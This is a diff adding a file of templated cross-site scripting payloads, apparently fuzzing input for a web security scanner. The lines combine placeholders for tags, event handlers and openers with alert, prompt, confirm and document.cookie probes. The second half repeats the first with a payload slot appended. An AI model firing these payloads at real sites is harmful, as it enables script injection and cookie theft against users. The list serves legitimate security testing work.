@@ -1,0 +1,170 @@
+﻿{open}<{tag} {evt}="alert(1)">
+<{tag} {evt} {open}{open}<{tag} {evt}="alert(1)">{open}{open}{tag}
+{open}{evt}<{tag} {evt}="alert(1)"
+<{tag} {evt}="{open}alert(1)">
+>><{tag}><{tag}></{tag}><{tag}>{open}{open}{open}<{tag}  {evt}="javascript:alert(1)">
+{open}<{tag} {evt}="{open}{evt}(1)">
+<{tag} {evt}={open}alert('XSS')>
+{evt}<{tag} {evt}="{open}alert(1)">
+<{tag} {evt}="javascript:{open}{evt}(1)">
+{open}<{tag} {evt}="{evt}(1)">
+{open}{evt}<{tag} {evt}="javascript:alert('Payload')">
+<{tag} {evt}="{open}document.cookie">
+{open}<{tag} {evt}="alert('Open')">
+<{tag} {evt}={open}{evt}("payload")>
+{open}{evt}{open}<{tag} {evt}="alert(1)">
+<{tag} {evt}={open}  {evt}=alert("Payload")>
+ {evt}={open}<{tag}  {evt}="alert('XSS')">
+{open}{tag}><{tag}  {evt}="javascript:alert('1')"
+<{tag}  {evt}{open}<{tag}  {evt}="alert(1)">
+{open} {evt}<{tag}  {evt}={open}"alert(1)"
+<{tag}  {evt}="alert(1);{open}">
+{open}<{tag}  {evt}= {evt}/// {evt}="alert('Injected')">
+<{tag}  {evt}={open}{open}alert("Exploit")>
+{open} {evt}<{tag} ={open} {evt}="javascript:alert(1)">
+{open}<{tag} = {evt}"alert('Example')">
+<{tag}  {evt}={open} {evt}("1")>
+ {evt}{open}<{tag} alert('Vulnerable')
+{open}<{tag} = {evt}"{open} {evt}=prompt(1)">
+{open}<{tag} alert('Injected')={open} {evt}=_=confirm`1`
+<{tag}  {evt}="javascript:{open} {evt}(1);">
+{open} {evt}<{tag} {open}alert('Payload')
+<{tag}  {evt}={open} {evt}(1);alert('Another')>
+{open} {evt}{open}<{tag} {open}javascript:alert(1)>
+<{tag}  {evt}={open} {evt}"{open}alert('XSS')">
+{open}<{tag}  {evt}="javascript: {evt}(1)">
+ {evt}<{tag} {open}"{open}alert('Execution')">
+{open}<{tag} ="javascript: {pay} {evt}(1)">
+{open}<{tag}  {evt}={open}alert('Simple')>
+<{tag}  {evt}="javascript:{open} {evt}(1)">
+{open} {evt}{open}<{tag} ="javascript: {evt}(1)">
+<{tag}  {evt}={open}"alert('Value')">
+{open}<{tag} = {evt}{open}="alert(' {evt}') {evt}=alert(//)">
+<{tag}  {evt}={open} {evt}alert('Dynamic')>
+{open} {evt}={open}<{tag} alert(1)>
+<{tag}  {evt}="{open}alert(1)={open}">
+ {evt}{open}{open}<{tag} alert('Event')>
+{open} {evt}<{tag} {open}alert('Double')
+{open}<{tag} ="javascript:{open} {evt}(1);">
+{open} {evt}{open}<{tag} alert(' {evt}')>
+<{tag}   {evt}={open}"alert('Extra')">
+{open} {evt}<{tag} = {evt}"alert('{open}')">
+{open}<{tag}  {evt}="javascript:{open} {evt}(1)">
+ {evt}={open}<{tag} {open}alert(' {evt}')>
+{open}<{tag}  {evt}="{open} {evt}(1)">
+{open}<{tag}  {evt}={open}"{pay}alert(' {evt}')">
+<{tag}  {evt}="{open} {evt}(1)">
+ {evt}{open}<{tag}  {evt}="javascript: {evt}(1);">
+{open}<{tag} = {evt} {evt}="alert(' {evt}')">
+<{tag}  {evt}={open}"alert('{open}')">
+{open} {evt}{open}<{tag} alert(' {evt}')>
+ {evt}={open}<{tag} alert('{open}')
+{open}<{tag}  {evt}= {evt} {evt}="alert('{open}')">
+<{tag}   {evt}="{open}javascript:alert(' {evt}')">
+{open} {evt}<{tag} alert('Injection')
+ {evt}{open}{open}<{tag} alert('Dynamic')
+{open}<{tag}  {evt}= {evt}"alert(' {evt}')">
+<{tag}  {evt}=" {evt}{open}alert(1)">
+{open}<{tag}  {evt}=" {evt}"{open}alert(1)">
+{open} {evt}{open}<{tag} javascript: {evt}(1);
+<{tag}  {evt}={open}" {evt}"{open}alert(1)">
+ {evt}={open}<{tag}  {evt}="alert(' {evt}')">
+{open}<{tag}  {evt}= {evt}alert('{open}')>
+{open} {evt}<{tag} " {evt}{open}alert(1)">
+<{tag}  {evt}="{open}alert(' {evt}')">
+ {evt}={open}<{tag} alert(' {evt}')=" {evt}"
+{open}<{tag} ="alert(' {evt}')"={open} {evt}
+<{tag}  {evt}=" {evt}"{open}alert(' {evt} {pay}')>
+{open} {evt}{open}<{tag} alert(' {evt}')={open}
+<{tag}  {evt}="{open}alert(' {evt}')">= {evt}
+{open}<{tag}  {evt}="alert('{open}')">= {evt}
+ {evt}{open}<{tag}  {evt}=alert(' {evt}')= {evt}
+{open}<{tag} " {evt}={open}alert(' {evt}')">
+ {evt}={open}<{tag}  {evt}=" {evt}"{open}alert(1)>
+{open}<{tag}  {evt}=alert(' {evt}')= {evt}alert('{open}')
+<{tag}  {evt}="prompt(/ {evt}/){open}alert(' {evt}')={open}"
+{open}<{tag} {evt}="alert(1)">{pay}
+<{tag} {evt} {open}{open}<{tag} {evt}="alert(1)">{pay}{open}{tag}
+{open}{evt}<{tag} {evt}="alert(1)">{pay}
+<{tag} {evt}="{open}alert(1)">{pay}>
+>><{tag}><{tag}></{tag}><{tag}>{open}{open}{open}<{tag}  {evt}="javascript:alert(1)">{pay}
+{open}<{tag} {evt}="{open}{evt}(1)">{pay}
+<{tag} {evt}={open}alert('XSS')>{pay}
+{evt}<{tag} {evt}="{open}alert(1)">{pay}
+<{tag} {evt}="javascript:{open}{evt}(1)">{pay}
+{open}<{tag} {evt}="{evt}(1)">{pay}
+{open}{evt}<{tag} {evt}="javascript:alert('Payload')">{pay}
+<{tag} {evt}="{open}document.cookie">{pay}
+{open}<{tag} {evt}="alert('Open')">{pay}
+<{tag} {evt}={open}{evt}("payload")>{pay}
+{open}{evt}{open}<{tag} {evt}="alert(1)">{pay}
+<{tag} {evt}={open}  {evt}=alert("Payload")>{pay}
+ {evt}={open}<{tag}  {evt}="alert('XSS')">{pay}
+{open}{tag}><{tag}  {evt}="javascript:alert('1')">{pay}
+<{tag}  {evt}{open}<{tag}  {evt}="alert(1)">{pay}
+{open} {evt}<{tag}  {evt}={open}"alert(1)">{pay}
+<{tag}  {evt}="alert(1);{open}">{pay}
+{open}<{tag}  {evt}= {evt}/// {evt}="alert('Injected')">{pay}
+<{tag}  {evt}={open}{open}alert("Exploit")>{pay}
+{open} {evt}<{tag} ={open} {evt}="javascript:alert(1)">{pay}
+{open}<{tag} = {evt}"alert('Example')">{pay}
+<{tag}  {evt}={open} {evt}("1")>{pay}
+ {evt}{open}<{tag} alert('Vulnerable'){pay}
+{open}<{tag} = {evt}"{open} {evt}=prompt(1)">{pay}
+{open}<{tag} alert('Injected')={open} {evt}=_=confirm`1`>{pay}
+<{tag}  {evt}="javascript:{open} {evt}(1);">{pay}
+{open} {evt}<{tag} {open}alert('Payload')>{pay}
+<{tag}  {evt}={open} {evt}(1);alert('Another')>{pay}
+{open} {evt}{open}<{tag} {open}javascript:alert(1)>{pay}
+<{tag}  {evt}={open} {evt}"{open}alert('XSS')">{pay}
+{open}<{tag}  {evt}="javascript: {evt}(1)">{pay}
+ {evt}<{tag} {open}"{open}alert('Execution')">{pay}
+{open}<{tag} ="javascript: {pay} {evt}(1)">{pay}
+{open}<{tag}  {evt}={open}alert('Simple')>{pay}
+<{tag}  {evt}="javascript:{open} {evt}(1)">{pay}
+{open} {evt}{open}<{tag} ="javascript: {evt}(1)">{pay}
+<{tag}  {evt}={open}"alert('Value')">{pay}
+{open}<{tag} = {evt}{open}="alert(' {evt}') {evt}=alert(//)">{pay}
+<{tag}  {evt}={open} {evt}alert('Dynamic')>{pay}
+{open} {evt}={open}<{tag} alert(1)>{pay}
+<{tag}  {evt}="{open}alert(1)={open}">{pay}
+ {evt}{open}{open}<{tag} alert('Event')>{pay}
+{open} {evt}<{tag} {open}alert('Double'){pay}
+{open}<{tag} ="javascript:{open} {evt}(1);">{pay}
+{open} {evt}{open}<{tag} alert(' {evt}')>{pay}
+<{tag}   {evt}={open}"alert('Extra')">{pay}
+{open} {evt}<{tag} = {evt}"alert('{open}')">{pay}
+{open}<{tag}  {evt}="javascript:{open} {evt}(1)">{pay}
+ {evt}={open}<{tag} {open}alert(' {evt}')>{pay}
+{open}<{tag}  {evt}="{open} {evt}(1)">{pay}
+{open}<{tag}  {evt}={open}"{pay}alert(' {evt}')">{pay}
+<{tag}  {evt}="{open} {evt}(1)">{pay}
+ {evt}{open}<{tag}  {evt}="javascript: {evt}(1);">{pay}
+{open}<{tag} = {evt} {evt}="alert(' {evt}')">{pay}
+<{tag}  {evt}={open}"alert('{open}')">{pay}
+{open} {evt}{open}<{tag} alert(' {evt}')>{pay}
+ {evt}={open}<{tag} alert('{open}'){pay}
+{open}<{tag}  {evt}= {evt} {evt}="alert('{open}')">{pay}
+<{tag}   {evt}="{open}javascript:alert(' {evt}')">{pay}
+{open} {evt}<{tag} alert('Injection'){pay}
+ {evt}{open}{open}<{tag} alert('Dynamic')>{pay}
+{open}<{tag}  {evt}= {evt}"alert(' {evt}')">{pay}
+<{tag}  {evt}=" {evt}{open}alert(1)">{pay}
+{open}<{tag}  {evt}=" {evt}"{open}alert(1)">{pay}
+{open} {evt}{open}<{tag} javascript: {evt}(1);">{pay}
+<{tag}  {evt}={open}" {evt}"{open}alert(1)">{pay}
+ {evt}={open}<{tag}  {evt}="alert(' {evt}')">{pay}
+{open}<{tag}  {evt}= {evt}alert('{open}')>{pay}
+{open} {evt}<{tag} " {evt}{open}alert(1)">{pay}
+<{tag}  {evt}="{open}alert(' {evt}')">{pay}
+ {evt}={open}<{tag} alert(' {evt}')=" {evt}">{pay}
+{open}<{tag} ="alert(' {evt}')"={open} {evt}>{pay}
+<{tag}  {evt}=" {evt}"{open}alert(' {evt} {pay}')">{pay}
+{open} {evt}{open}<{tag} alert(' {evt}')={open}>{pay}
+<{tag}  {evt}="{open}alert(' {evt}')">= {evt}>{pay}
+{open}<{tag}  {evt}="alert('{open}')">= {evt}>{pay}
+ {evt}{open}<{tag}  {evt}=alert(' {evt}')= {evt}>{pay}
+{open}<{tag} " {evt}={open}alert(' {evt}')">{pay}
+ {evt}={open}<{tag}  {evt}=" {evt}"{open}alert(1)>{pay}
+{open}<{tag}  {evt}=alert(' {evt}')= {evt}alert('{open}')>{pay}
+<{tag}  {evt}="prompt(/ {evt}/){open}alert(' {evt}')={open}">{pay}
